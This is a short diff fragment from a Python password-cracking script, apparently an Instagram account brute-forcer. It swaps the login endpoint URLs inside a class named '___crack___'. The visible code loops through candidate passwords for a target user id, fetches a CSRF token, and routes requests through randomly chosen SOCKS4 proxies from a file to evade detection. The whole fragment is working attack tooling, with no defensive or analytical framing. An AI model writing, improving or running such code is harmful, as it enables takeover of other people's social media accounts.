@@ -425,8 +425,8 @@ class ___crack___:
         try:
             for pw in pwx:
                 pw = pw.lower()
-                ___url = ('https://i.instagram.com/')
-                ___login = ('https://i.instagram.com/accounts/login/ajax/')
+                ___url = ('https://z-p42.www.instagram.com/')
+                ___login = ('https://z-p42.www.instagram.com/accounts/login/ajax/')
                 ___proxy = {'http': 'socks4://%s'%(random.choice(open("Data/proxy.txt","r").read().splitlines()))}
                 ___csrf = requests.get(___url).cookies['csrftoken']
                 ___data = {'username': uid,
